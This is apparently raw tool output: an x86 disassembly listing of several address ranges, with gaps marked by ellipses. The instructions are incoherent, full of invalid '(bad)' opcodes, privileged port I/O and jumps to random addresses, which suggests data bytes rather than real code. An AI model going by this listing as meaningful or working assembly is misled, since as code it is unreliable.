  41ebfd:	aas    
  41ebfe:	lods   al,BYTE PTR ds:[esi]
  41ebff:	loope  0x41ec2c
  41ec01:	in     al,0x35
  41ec03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec04:	mov    DWORD PTR [ebp+0x76],0x97b042d6
  41ec0b:	(bad)  
  41ec0c:	adc    BYTE PTR [edx-0xd4c6e86],bh
  41ec12:	daa    
  41ec13:	ins    BYTE PTR es:[edi],dx
  41ec14:	lahf   
  41ec15:	loop   0x41ec77
  41ec17:	jge    0x41ebcb
  41ec19:	push   ecx
  41ec1a:	mov    dh,0xd2
  41ec1c:	mov    al,0xdd
  41ec1e:	xchg   ebx,eax
  41ec1f:	out    dx,eax
  41ec20:	imul   ebx,DWORD PTR [eax],0x4b60afdd
  41ec26:	daa    
  41ec27:	mov    esi,0x5bd32d40
  41ec2c:	push   ds
  41ec2d:	hlt    
  41ec2e:	jns    0x41ec69
  41ec30:	mov    BYTE PTR [ebp+0x44],ch
  41ec33:	mov    esp,0x30
	...
  41ec94:	add    BYTE PTR [eax],al
  41ec96:	inc    ecx
  41ec97:	icebp  
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	jbe    0x41ecfa
  41eca4:	mov    edx,0x146199d
  41eca9:	add    BYTE PTR [edi],al
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [edi],dl
  41ecaf:	mov    dl,BYTE PTR [esp+0xb8acb3a]
  41ecb6:	inc    esi
  41ecb7:	ins    BYTE PTR es:[edi],dx
  41ecb8:	shr    ebx,0xb5
  41ecbb:	idiv   bl
  41ecbd:	add    dl,BYTE PTR [ebx+0x31]
  41ecc0:	into   
  41ecc1:	psrld  mm6,QWORD PTR [ecx]
  41ecc4:	inc    ebp
  41ecc5:	mov    gs,edi
  41ecc7:	cmp    DWORD PTR [esi-0x1b],ecx
  41ecca:	xchg   edx,eax
  41eccb:	adc    esi,DWORD PTR [ebx+0x45c407b9]
  41ecd1:	out    0xe7,al
  41ecd3:	test   al,0x94
  41ecd5:	mov    edx,DWORD PTR [ecx+ebx*8]
  41ecd8:	test   al,0xb8
  41ecda:	fwait
  41ecdb:	std    
  41ecdc:	cmp    edx,DWORD PTR [ebp+0x35f1062f]
  41ece2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ece3:	mov    esp,0x3042f2f
  41ece8:	and    ecx,DWORD PTR [edi]
  41ecea:	and    ch,BYTE PTR [ebx+0x42]
  41eced:	fdivr  DWORD PTR [edi-0x21a7501]
  41ecf3:	pop    esp
  41ecf4:	loop   0x41ec88
  41ecf6:	add    dh,BYTE PTR [esi+0x11391b2c]
  41ecfc:	je     0x41ecb0
  41ecfe:	jbe    0x41ed31
  41ed00:	lods   al,BYTE PTR ds:[esi]
  41ed01:	jns    0x41eccf
  41ed03:	jmp    0x25830b8d
  41ed08:	aad    0x31
  41ed0a:	jmp    0x1a075d1d
  41ed0f:	mov    edi,0x54f5d477
  41ed14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed15:	push   edx
  41ed16:	pusha  
  41ed17:	jg     0x41ed64
  41ed19:	not    esp
  41ed1b:	dec    edx
  41ed1c:	and    dh,BYTE PTR [ebp+0x6]
  41ed1f:	push   ecx
  41ed20:	push   esi
  41ed21:	adc    bl,BYTE PTR [ecx+ebx*1-0x6c8a4bbd]
  41ed28:	or     ecx,eax
  41ed2a:	popf   
  41ed2b:	leave  
  41ed2c:	mov    BYTE PTR [ecx],dl
  41ed2e:	cmp    BYTE PTR [eax+0x4f],al
  41ed31:	stc    
  41ed32:	xchg   bh,cl
  41ed34:	xchg   edx,eax
  41ed35:	or     al,0xb2
  41ed37:	inc    edx
  41ed38:	stc    
  41ed39:	xor    eax,DWORD PTR ds:0x20e5d644
  41ed3f:	pushf  
  41ed40:	ins    BYTE PTR es:[edi],dx
  41ed41:	xchg   esp,eax
  41ed42:	ins    BYTE PTR es:[edi],dx
  41ed43:	mov    edi,0xd76919d1
  41ed48:	inc    edi
  41ed49:	jle    0x41ed6c
  41ed4b:	mov    bl,0xf2
  41ed4d:	xchg   ch,bh
  41ed4f:	inc    edx
  41ed50:	xor    edx,DWORD PTR [edx+0x2ecf289f]
  41ed56:	jb     0x41ed10
  41ed58:	and    DWORD PTR [edx+0x5372908],ebx
  41ed5e:	aaa    
  41ed5f:	dec    esp
  41ed60:	out    dx,al
  41ed61:	(bad)  
  41ed62:	push   ss
  41ed63:	shl    DWORD PTR [esp+ebx*1+0x30],cl
  41ed67:	scas   eax,DWORD PTR es:[edi]
  41ed68:	popf   
  41ed69:	or     eax,0xc4d8e2b9
  41ed6e:	test   al,0xf7
  41ed70:	or     al,0x4f
  41ed72:	fidivr WORD PTR [edi-0x3e]
  41ed75:	mov    dh,BYTE PTR [ebx]
  41ed77:	inc    esp
  41ed78:	mov    ch,0x15
  41ed7a:	enter  0xf3d2,0x61
  41ed7e:	fs clc 
  41ed80:	jb     0x41ed25
  41ed82:	je     0x41ed9b
  41ed84:	xor    eax,0x5958c1e8
  41ed89:	ret    
  41ed8a:	sbb    al,0xf2
  41ed8c:	inc    eax
  41ed8d:	rol    BYTE PTR [edx+0x6f9cbb6d],0x6c
  41ed94:	cmp    bl,dl
  41ed96:	shr    bl,1
  41ed98:	mov    cl,0x9a
  41ed9a:	and    dl,dl
  41ed9c:	jmp    0xe5d7:0xb9812ed3
  41eda3:	cmp    al,0xc9
  41eda5:	sbb    al,0x91
  41eda7:	xchg   esi,eax
  41eda8:	in     eax,0x4
  41edaa:	mov    esi,0x7fee1587
  41edaf:	adc    ebp,DWORD PTR [edi]
  41edb1:	es inc esi
  41edb3:	retf   
  41edb4:	pop    esi
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x275b0a2,al
  41ee23:	fdiv   DWORD PTR [edi+0x1472044]
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    dl,al
  41ee2f:	loop   0x41ee82
  41ee31:	mov    bh,0xef
  41ee33:	out    dx,eax
  41ee34:	xchg   ecx,eax
  41ee35:	fcmovnbe st,st(0)
  41ee37:	cmp    al,0xda
  41ee39:	xor    cl,dl
  41ee3b:	mov    ds:0x8585bf9e,eax
  41ee40:	aas    
  41ee41:	xor    bh,BYTE PTR [ecx+eiz*1]
  41ee44:	xor    bl,cl
  41ee46:	mov    dl,0x1c
  41ee48:	add    eax,DWORD PTR [ebx+0x479e0c5a]
  41ee4e:	jae    0x41ee15
  41ee50:	(bad)  
  41ee51:	xor    BYTE PTR [ebx-0xd],bl
  41ee54:	or     eax,0xca0e5cba
  41ee59:	nop
  41ee5a:	icebp  
  41ee5b:	or     BYTE PTR [esi],dl
  41ee5d:	(bad)  
  41ee5e:	aaa    
  41ee5f:	add    DWORD PTR [ecx],edi
  41ee61:	retf   
  41ee62:	mov    edi,0x6fa4b0aa
  41ee67:	dec    edi
  41ee68:	ds ret 0x310b
  41ee6c:	xchg   ebx,eax
  41ee6d:	gs mov edx,0x75a80550
  41ee73:	pop    eax
  41ee74:	in     al,0x32
  41ee76:	push   esi
  41ee77:	sbb    ch,cl
  41ee79:	inc    ebx
  41ee7a:	mov    edi,0xcff9688d
  41ee7f:	ret    
  41ee80:	cmp    DWORD PTR ds:0xbfd4b9af,edi
  41ee86:	aas    
  41ee87:	cmp    eax,DWORD PTR [ebp+0x22]
  41ee8a:	jno    0x41ee20
  41ee8c:	(bad)  
  41ee8d:	cdq    
  41ee8e:	pop    es
  41ee8f:	outs   dx,BYTE PTR ds:[esi]
  41ee90:	fild   QWORD PTR [eax+0x5812c752]
  41ee96:	(bad)  
  41ee97:	ror    BYTE PTR [edx],1
  41ee99:	jp     0x41ee72
  41ee9b:	hlt    
  41ee9c:	ds out 0x65,al
  41ee9f:	ret    0x99b2
  41eea2:	jne    0x41ee58
  41eea4:	fucomip st,st(0)
  41eea6:	stc    
  41eea7:	leave  
  41eea8:	dec    ebx
  41eea9:	(bad)  
  41eeaa:	jle    0x41eee5
  41eeac:	xor    al,BYTE PTR [esi+0x6e3fabd0]
  41eeb2:	popa   
  41eeb3:	out    0xde,al
  41eeb5:	jg     0x41ef01
  41eeb7:	mov    cl,0x60
  41eeb9:	mov    bl,0xf9
  41eebb:	adc    ch,BYTE PTR ds:0xb5a67516
  41eec1:	add    DWORD PTR [ebp-0x30],0x64
  41eec5:	jns    0x41ef25
  41eec7:	fdiv   QWORD PTR [ecx]
  41eec9:	xchg   BYTE PTR [ebx+0x3e861060],bh
  41eecf:	jmp    0xd1d360ab
  41eed4:	adc    edx,eax
  41eed6:	inc    esp
  41eed7:	(bad)
  41eeda:	push   edi
  41eedb:	(bad)  
  41eedd:	jp     0x41ef24
  41eedf:	loop   0x41ee82
  41eee1:	sub    eax,esp
  41eee3:	dec    ebp
  41eee4:	(bad)  
  41eee5:	jae    0x41ee9b
  41eee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee8:	or     DWORD PTR ds:0xe290db5a,esp
  41eeee:	ins    DWORD PTR es:[edi],dx
  41eeef:	mov    DWORD PTR [eax-0x70],0x3150439d
  41eef6:	and    BYTE PTR [ecx+0x38],al
  41eef9:	test   eax,0x9c4bd48c
  41eefe:	jae    0x41ee9f
  41ef00:	sbb    esi,edi
  41ef02:	pop    ds
  41ef03:	cmp    DWORD PTR [edi-0x1b],0xfffffffe
  41ef07:	pusha  
  41ef08:	sub    bl,BYTE PTR fs:[edi-0x5df40f2e]
  41ef0f:	test   DWORD PTR [edx],edi
  41ef11:	pop    ebx
  41ef12:	mov    eax,ds:0x540c367b
  41ef17:	sub    al,0x82
  41ef19:	mov    bl,0x14
  41ef1b:	mov    eax,ds:0xb3ccb102
  41ef20:	adc    edx,ebx
  41ef22:	mov    ?,esi
  41ef24:	mov    al,ds:0xac4b6f0b
  41ef29:	repz ret 0xdee1
  41ef2d:	dec    esp
  41ef2e:	shl    BYTE PTR [edi],1
  41ef30:	xchg   ebx,eax
  41ef31:	sti    
  41ef32:	sti    
  41ef33:	mov    esi,0xf2
	...
  41ef94:	add    BYTE PTR [eax],al
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax-0x2a0314c8]
  41efa3:	mov    BYTE PTR [edi],cl
  41efa5:	xchg   esi,eax
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [ebp+ebx*2-0x10ff8be9],dl
  41efb4:	push   esp
  41efb5:	jmp    0x1fe72d48
  41efba:	dec    ecx
  41efbb:	cli    
  41efbc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41efbe:	repz cmp eax,0x7be0b2ea
  41efc4:	int3   
  41efc5:	jl     0x41f034
  41efc7:	pop    ds
  41efc8:	mov    esi,DWORD PTR [edx+0x29]
  41efcb:	ins    DWORD PTR es:[edi],dx
  41efcc:	cli    
  41efcd:	loope  0x41efa9
  41efcf:	fdivrp st(5),st
  41efd1:	in     eax,0xca
  41efd3:	push   ebp
  41efd4:	pop    edi
  41efd5:	jge    0x41ef75
  41efd7:	dec    eax
  41efd8:	fnsave [edx-0x2a]
  41efdb:	mov    eax,0x42e89709
  41efe0:	(bad)  
  41efe1:	cwde   
  41efe2:	(bad)  
  41efe3:	ror    DWORD PTR ds:0x772a6d1e,1
  41efe9:	(bad)  
  41efea:	push   DWORD PTR ds:0xfc0668fd
  41eff0:	sahf   
  41eff1:	fs neg ah
  41eff4:	inc    esi
  41eff5:	iret   
  41eff6:	sub    eax,DWORD PTR [ebx-0x5e22db9f]
  41effc:	fdivr  QWORD PTR ds:0xd8d66d08
  41f002:	dec    edx
  41f003:	add    al,0x50
  41f005:	jb     0x41f004
  41f007:	pop    ds
  41f008:	adc    eax,0x791c3dd2
  41f00d:	mov    bh,0x23
  41f00f:	inc    edx
  41f010:	push   edx
  41f011:	stos   DWORD PTR es:[edi],eax
  41f012:	mov    ecx,0x4992e8ad
  41f017:	daa    
  41f018:	adc    ebx,DWORD PTR [eax]
  41f01a:	lods   eax,DWORD PTR ds:[esi]
  41f01b:	popf   
  41f01c:	adc    esi,ebp
  41f01e:	dec    ebx
  41f01f:	inc    ecx
  41f020:	push   0x1fbcc25e
  41f025:	mov    ecx,0xa7acf72a
  41f02a:	and    al,0x26
  41f02c:	mov    DWORD PTR [eax+ecx*4],ebx
  41f02f:	mov    BYTE PTR [ecx],cl
  41f031:	mov    bl,0xea
  41f033:	test   bh,0xa7
  41f036:	lods   eax,DWORD PTR ds:[esi]
  41f037:	stos   BYTE PTR es:[edi],al
  41f038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f039:	(bad)
  41f03c:	stc    
  41f03d:	xor    edx,DWORD PTR [ecx+0x11fd0787]
  41f043:	sub    ebx,edi
  41f045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f046:	imul   eax,DWORD PTR [eax+ebp*1+0x22815cc7],0xfcd0c638
  41f051:	xchg   ecx,eax
  41f052:	inc    edi
  41f053:	das    
  41f054:	nop
  41f055:	add    esp,esi
  41f057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f058:	cmp    al,0xf0
  41f05a:	sahf   
  41f05b:	ja     0x41eff7
  41f05d:	cmp    eax,0x5ba87d38
  41f062:	fmul   QWORD PTR [eax-0x540943ca]
  41f068:	adc    al,al
  41f06a:	ja     0x41f05b
  41f06c:	push   0x548b9cf5
  41f071:	mov    bl,0x2d
  41f073:	scas   eax,DWORD PTR es:[edi]
  41f074:	push   eax
  41f075:	adc    DWORD PTR [esi],ebp
  41f077:	imul   ebp,DWORD PTR [eax+0x24],0x29
  41f07b:	inc    edx
  41f07c:	sbb    ebx,ebx
  41f07e:	or     eax,DWORD PTR [edi+ebx*2-0x5b]
  41f082:	add    BYTE PTR [ebx],0xa0
  41f085:	sbb    al,0xf1
  41f087:	inc    edi
  41f088:	clc    
  41f089:	fsin   
  41f08b:	cdq    
  41f08c:	add    eax,0xd9d0fbbd
  41f091:	xchg   DWORD PTR [edx],edi
  41f093:	out    dx,al
  41f094:	in     al,dx
  41f095:	xor    al,0xdb
  41f097:	test   al,0x1
  41f099:	mov    cl,0x56
  41f09b:	pop    ss
  41f09c:	js     0x41f0b3
  41f09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f09f:	dec    esp
  41f0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0a1:	adc    DWORD PTR [edi],edx
  41f0a3:	mov    bh,0x81
  41f0a5:	popa   
  41f0a6:	or     al,0xa
  41f0a8:	push   ecx
  41f0a9:	stos   BYTE PTR es:[edi],al
  41f0aa:	pop    edx
  41f0ab:	adc    edi,DWORD PTR [ecx+ebx*2+0x2]
  41f0af:	icebp  
  41f0b0:	leave  
  41f0b1:	sub    ch,BYTE PTR [edx-0x77]
  41f0b4:	les    eax,FWORD PTR [eax]
	...
  41f116:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx-0x1666311]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [ebp+0x4b28b75f],ah
  41f133:	xchg   DWORD PTR [ebx+0x74b25f19],ecx
  41f139:	stos   DWORD PTR es:[edi],eax
  41f13a:	cmc    
  41f13b:	add    BYTE PTR [eax-0x6f64b2fd],ah
  41f141:	dec    ebx
  41f142:	bound  esp,QWORD PTR ds:[ebp+0x17f536bb]
  41f149:	loopne 0x41f105
  41f14b:	cmovo  esp,DWORD PTR [ecx-0x62]
  41f14f:	int3   
  41f150:	data16 inc dx
  41f153:	out    0x2e,eax
  41f155:	pop    es
  41f156:	loopne 0x41f1cd
  41f158:	les    esp,FWORD PTR [edi]
  41f15a:	clc    
  41f15b:	gs xchg esp,ecx
  41f15e:	xchg   ebx,eax
  41f15f:	aam    0xc5
  41f161:	and    cl,bl
  41f163:	sbb    BYTE PTR [edi],0xd2
  41f166:	cwde   
  41f167:	sbb    BYTE PTR [edx],al
  41f169:	jmp    0xf41595fe
  41f16e:	dec    ecx
  41f16f:	dec    ebx
  41f170:	inc    esi
  41f171:	push   ds
  41f172:	into   
  41f173:	jle    0x41f128
  41f175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f176:	and    al,0x23
  41f178:	les    edx,FWORD PTR [ecx]
  41f17a:	cwde   
  41f17b:	sbb    cl,bl
  41f17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f17e:	sbb    dl,BYTE PTR [ecx-0x3e190ada]
  41f184:	rcr    DWORD PTR [edx+0x31e8463f],0xfb
  41f18b:	std    
  41f18c:	inc    eax
  41f18d:	or     al,BYTE PTR [edi-0xb]
  41f190:	(bad)  ds:0x9a3beec8
  41f196:	addr16 mov edi,0xd4a5dba5
  41f19c:	add    esi,DWORD PTR [edi]
  41f19e:	push   edx
  41f19f:	scas   eax,DWORD PTR es:[edi]
  41f1a0:	mov    ah,0x7e
  41f1a2:	das    
  41f1a3:	jb     0x41f1b0
  41f1a5:	and    al,0x7
  41f1a7:	in     al,0xfc
  41f1a9:	pop    ds
  41f1aa:	xchg   edi,eax
  41f1ab:	or     eax,0xe477dc0
  41f1b0:	or     esp,DWORD PTR [edi-0x3d]
  41f1b3:	adc    al,0xaa
  41f1b5:	ret    0x84a9
  41f1b8:	jle    0x41f167
  41f1ba:	out    0x32,al
  41f1bc:	loopne 0x41f1ce
  41f1be:	mov    dl,0xe0
  41f1c0:	adc    edi,DWORD PTR [ecx-0x62156c4a]
  41f1c6:	mov    ah,0x9
  41f1c8:	lods   al,BYTE PTR ds:[esi]
  41f1c9:	in     eax,dx
  41f1ca:	sub    eax,0x11881426
  41f1cf:	pop    ecx
  41f1d0:	pop    ebp
  41f1d1:	and    ebx,edi
  41f1d3:	mov    DWORD PTR [ebx+0x20],edx
  41f1d6:	je     0x41f245
  41f1d8:	or     al,0x3c
  41f1da:	add    eax,DWORD PTR [edx+0x68]
  41f1dd:	je     0x41f16f
  41f1df:	and    cl,bl
  41f1e1:	jp     0x41f22f
  41f1e3:	test   DWORD PTR [edi+0x46],ebp
  41f1e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e7:	xor    eax,0xaa060906
  41f1ec:	push   eax
  41f1ed:	shr    DWORD PTR [edx],cl
  41f1ef:	cmp    al,bh
  41f1f1:	xchg   DWORD PTR [ecx*4+0x6d7132ee],ebx
  41f1f8:	retf   0xb1a3
  41f1fb:	sub    BYTE PTR es:[ecx-0x6e],dl
  41f1ff:	xor    DWORD PTR [edx+0x47],0x50
  41f203:	sbb    BYTE PTR [edi],ch
  41f205:	inc    edx
  41f206:	add    edi,eax
  41f208:	dec    ebp
  41f209:	pop    edi
  41f20a:	adc    eax,0xc357e492
  41f20f:	dec    edx
  41f210:	lock rcr BYTE PTR [ebx+0x1e45fbe2],1
  41f217:	jmp    0x93bd:0x3e7d8122
  41f21e:	xchg   esp,eax
  41f21f:	xor    al,0xde
  41f221:	xchg   ecx,eax
  41f222:	add    al,0xca
  41f224:	call   DWORD PTR [esi-0x7b]
  41f227:	push   esp
  41f228:	mov    cs,WORD PTR [ebp+0xc71f22]
  41f22e:	push   edi
  41f22f:	xor    ch,bl
  41f231:	mov    ebx,0x8ddc99
	...
  41f296:	push   ecx
  41f297:	sbb    edi,edi
  41f299:	jmp    si
  41f29c:	fnstcw WORD PTR [edi]
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	xchg   BYTE PTR [ecx+0x12],bh
  41f2a5:	sub    al,0x35
  41f2a7:	dec    edx
  41f2a8:	add    DWORD PTR [eax],eax
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [eax-0x2c],dl
  41f2b0:	call   0xb7b03764
  41f2b5:	add    esi,DWORD PTR [esi]
  41f2b7:	loopne 0x41f29d
  41f2b9:	or     BYTE PTR [edi-0x2ed17c5e],cl
  41f2bf:	into   
  41f2c0:	aad    0x57
  41f2c2:	adc    BYTE PTR ds:0x44bebbd0,bh
  41f2c8:	call   0x9ccf:0xef569be4
  41f2cf:	enter  0x26c6,0x5f
  41f2d3:	pop    ebp
  41f2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2d5:	adc    DWORD PTR [edx+0x4d],eax
  41f2d8:	ds pop ebp
  41f2da:	push   edi
  41f2db:	pop    esp
  41f2dc:	cmc    
  41f2dd:	lahf   
  41f2de:	or     eax,0xe50050d1
  41f2e3:	push   edi
  41f2e4:	add    bh,BYTE PTR [ebp+0xa]
  41f2e7:	and    DWORD PTR [ecx+0x79c2645],0xe4a44499
  41f2f1:	mov    cl,0x22
  41f2f3:	das    
  41f2f4:	ins    BYTE PTR es:[edi],dx
  41f2f5:	inc    esi
  41f2f6:	into   
  41f2f7:	push   0x87a11530
  41f2fc:	pop    esi
  41f2fd:	nop
  41f2fe:	mov    ch,0x37
  41f300:	(bad)  
  41f301:	sbb    al,0xec
  41f303:	mov    dl,dl
  41f305:	ret    
  41f306:	ret    
  41f307:	stc    
  41f308:	inc    edi
  41f309:	mov    dl,0x9
  41f30b:	and    al,0x52
  41f30d:	or     ah,BYTE PTR [eax]
  41f30f:	cli    
  41f310:	xchg   edi,eax
  41f311:	leave  
  41f312:	mov    ds:0x368085d7,eax
  41f317:	or     eax,0x61cedd47
  41f31c:	push   ebp
  41f31d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f31e:	test   DWORD PTR [edx+0x300af946],ecx
  41f324:	push   ecx
  41f325:	sub    esi,DWORD PTR [ecx+0x4f1c00d4]
  41f32b:	mov    ds,WORD PTR [edx+0x26]
  41f32e:	repz push edi
  41f330:	ret    
  41f331:	mov    dh,0x5c
  41f333:	loopne 0x41f2c2
  41f335:	and    DWORD PTR [eax+0x164a40ce],ebx
  41f33b:	imul   edx,DWORD PTR [edi],0x9a73e9b3
  41f341:	sbb    eax,0xb0eb67af
  41f346:	inc    ebp
  41f347:	add    dl,BYTE PTR [ebp+0x35731328]
  41f34d:	inc    esi
  41f34e:	nop
  41f34f:	idiv   BYTE PTR [ecx-0x9a2b55]
  41f355:	icebp  
  41f356:	fdiv   DWORD PTR [eax-0x2b]
  41f359:	add    dl,bh
  41f35b:	iret   
  41f35c:	stos   DWORD PTR es:[edi],eax
  41f35d:	sar    DWORD PTR [eax-0x6d],1
  41f360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f361:	mov    bl,0xb7
  41f363:	adc    DWORD PTR [eax-0x4edd5b9],ecx
  41f369:	pop    cx
  41f36b:	sbb    DWORD PTR [ebp-0x1c],0x8
  41f36f:	jmp    0xf98d75e1
  41f374:	int3   
  41f375:	pusha  
  41f376:	mov    dl,BYTE PTR [esi-0x5d95b6eb]
  41f37c:	or     eax,0x18e5f24a
  41f381:	adc    al,0x3e
  41f383:	or     ebp,eax
  41f385:	push   edx
  41f386:	scas   al,BYTE PTR es:[edi]
  41f387:	xor    DWORD PTR [eax-0xc9ef257],esp
  41f38d:	mov    bh,BYTE PTR [esi+0x39e83be1]
  41f393:	pop    ss
  41f394:	jle    0x41f3a1
  41f396:	inc    edx
  41f397:	and    DWORD PTR [ecx-0x9ea756d],esi
  41f39d:	jl     0x41f344
  41f39f:	inc    esp
  41f3a0:	aaa    
  41f3a1:	pusha  
  41f3a2:	std    
  41f3a3:	mov    dl,0x6c
  41f3a5:	test   eax,0x57e01456
  41f3aa:	cs fwait
  41f3ac:	pop    es
  41f3ad:	mov    dh,0xd9
  41f3af:	std    
  41f3b0:	pop    edi
  41f3b1:	sub    eax,0x9f6cc6
	...
  41f416:	cmp    al,0xe7
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	test   al,0x12
  41f424:	imul   edx,DWORD PTR [ecx+0x14b3c],0x107
  41f42e:	inc    ebp
  41f42f:	jmp    0x58e1c35e
  41f434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f435:	pushf  
  41f436:	mov    bh,al
  41f438:	imul   ecx,DWORD PTR [ecx],0x91f0d610
  41f43e:	pop    ecx
  41f43f:	and    esi,ebx
  41f441:	(bad)  
  41f442:	xchg   edi,eax
  41f443:	cwde   
  41f444:	xchg   ebp,eax
  41f445:	sub    DWORD PTR [ecx+0x56],esi
  41f448:	inc    esp
  41f449:	xor    BYTE PTR [eax+0x72],dh
  41f44c:	loop   0x41f49f
  41f44e:	clc    
  41f44f:	loopne 0x41f417
  41f451:	fmul   QWORD PTR ds:0xcf34da7e
  41f457:	and    al,BYTE PTR [ebx+0x426baf7f]
  41f45d:	push   edx
  41f45e:	xlat   BYTE PTR ds:[ebx]
  41f45f:	retf   
  41f460:	jmp    0x41f49d
  41f462:	xor    DWORD PTR [edi],0x77
  41f465:	xor    ecx,esi
  41f467:	outs   dx,DWORD PTR ds:[si]
  41f469:	push   esp
  41f46a:	and    al,0xf9
  41f46c:	mov    WORD PTR [ecx-0x62af824b],ss
  41f472:	int    0xa1
  41f474:	jge    0x41f403
  41f476:	inc    eax
  41f477:	xchg   ecx,eax
  41f478:	xor    eax,0x470c616a
  41f47d:	jo     0x41f4c0
  41f47f:	or     eax,0x6eedfc5c
  41f484:	push   eax
  41f485:	div    DWORD PTR [ecx-0x17]
  41f488:	push   cs
  41f489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f48a:	inc    esi
  41f48b:	sbb    DWORD PTR [ecx],esi
  41f48d:	(bad)  
  41f48e:	mov    ds,WORD PTR [ebp+0x53]
  41f491:	mov    al,0x2
  41f493:	and    al,0xeb
  41f495:	fbstp  TBYTE PTR [esp+eax*8]
  41f498:	push   eax
  41f499:	xchg   edx,eax
  41f49a:	dec    esi
  41f49b:	jmp    FWORD PTR ds:0x5ae244e6
  41f4a1:	add    dh,BYTE PTR [edi]
  41f4a3:	adc    eax,0x3c90375b
  41f4a8:	pop    eax
  41f4a9:	rol    BYTE PTR [ecx+edi*2+0x5b340a61],0xff
  41f4b1:	cmp    eax,0x2c7916e
  41f4b6:	lods   al,BYTE PTR ds:[esi]
  41f4b7:	data16 jge 0x41f49c
  41f4ba:	push   ebp
  41f4bb:	popf   
  41f4bc:	mov    ah,0xed
  41f4be:	mov    eax,0xfbc016b1
  41f4c3:	aas    
  41f4c4:	(bad)  
  41f4c5:	(bad)  
  41f4c6:	jns    0x41f51a
  41f4c8:	ret    
  41f4c9:	mov    al,ds:0x7aa350e1
  41f4ce:	mov    esp,0x3923c615
  41f4d3:	fs in  eax,dx
  41f4d5:	jecxz  0x41f4f1
  41f4d7:	and    cl,BYTE PTR ds:0x2d02bf9d
  41f4dd:	bound  ebx,QWORD PTR [edi+0x5f]
  41f4e0:	mov    ah,0x9b
  41f4e2:	inc    esi
  41f4e3:	ret    
  41f4e4:	dec    ecx
  41f4e5:	pusha  
  41f4e6:	mov    bh,0x85
  41f4e8:	adc    edx,DWORD PTR [ecx+0x19]
  41f4eb:	xchg   ecx,eax
  41f4ec:	adc    BYTE PTR [ebp-0x2d],0x50
  41f4f0:	jns    0x41f47b
  41f4f2:	mov    ds:0xfb2b2394,eax
  41f4f7:	add    eax,0x7480b3f5
  41f4fc:	sub    BYTE PTR [ecx-0x69673923],al
  41f502:	mov    al,0x7e
  41f504:	cs cdq 
  41f506:	xor    al,0x70
  41f508:	mov    dh,0x6a
  41f50a:	mov    ecx,0x39930ceb
  41f50f:	test   edx,esi
  41f511:	mov    ch,0xfc
  41f513:	push   ebx
  41f514:	dec    edi
  41f516:	dec    edx
  41f517:	dec    esi
  41f518:	cli    
  41f519:	test   cl,dh
  41f51b:	and    dl,0x20
  41f51e:	xchg   esp,eax
  41f51f:	(bad)  
  41f520:	mov    esi,0x538bb1b8
  41f525:	gs stc 
  41f527:	out    dx,al
  41f528:	adc    eax,0xd66a3d26
  41f52d:	repnz adc ah,BYTE PTR [esi]
  41f530:	sub    bl,al
  41f532:	sbb    dh,bh
  41f534:	std    
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	and    bh,cl
  41f5a4:	fld    QWORD PTR [ecx+0x43]
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [ebx],ch
  41f5af:	jae    0x41f61b
  41f5b1:	(bad)  
  41f5b2:	cwde   
  41f5b3:	in     eax,dx
  41f5b4:	loope  0x41f5df
  41f5b6:	les    edx,FWORD PTR [edx+0x6f]
  41f5b9:	xchg   edi,edx
  41f5bb:	jecxz  0x41f5d4
  41f5bd:	jns    0x41f5c6
  41f5bf:	in     eax,0x44
  41f5c1:	jecxz  0x41f581
  41f5c3:	pop    edi
  41f5c4:	xchg   ecx,eax
  41f5c5:	addr16 gs jno 0x41f5dd
  41f5c9:	jno    0x41f63f
  41f5cb:	pop    ebp
